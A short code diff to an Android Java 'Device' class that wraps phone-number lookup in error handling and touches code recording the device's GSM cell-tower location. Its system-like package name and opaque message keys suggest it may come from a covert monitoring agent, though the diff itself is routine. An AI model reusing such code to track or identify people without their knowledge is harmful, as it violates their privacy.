@@ -24,7 +24,7 @@ import com.android.networking.util.Check;
 public class Device {
 	private static final String TAG = "Device"; //$NON-NLS-1$
 
-	public static final String UNKNOWN_NUMBER = "Unknown";
+	public static final String UNKNOWN_NUMBER = "";
 
 	/** The singleton. */
 	private volatile static Device singleton;
@@ -52,14 +52,20 @@ public class Device {
 	 * @return the phone number
 	 */
 	public String getPhoneNumber() {
-		TelephonyManager mTelephonyMgr;
+		String number = null;
+		try {
+			TelephonyManager mTelephonyMgr;
+			mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
 
-		mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
-
-		String number = mTelephonyMgr.getLine1Number();
+			number = mTelephonyMgr.getLine1Number();
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getPhoneNumber) Error: " + ex);
+			}
+		}
 
 		if (number == null || number.length() == 0) {
-			number = UNKNOWN_NUMBER; //$NON-NLS-1$
+			number = UNKNOWN_NUMBER;
 		}
 
 		return number;
@@ -159,7 +165,6 @@ public class Device {
 				Check.asserts(Device.isGprs(), Messages.getString("31_8")); //$NON-NLS-1$
 			}
 			final GsmCellLocation cell = (GsmCellLocation) bcell;
-			
 
 			info.setGsm(conf.mcc, conf.mnc, cell.getLac(), cell.getCid(), rssi);
 
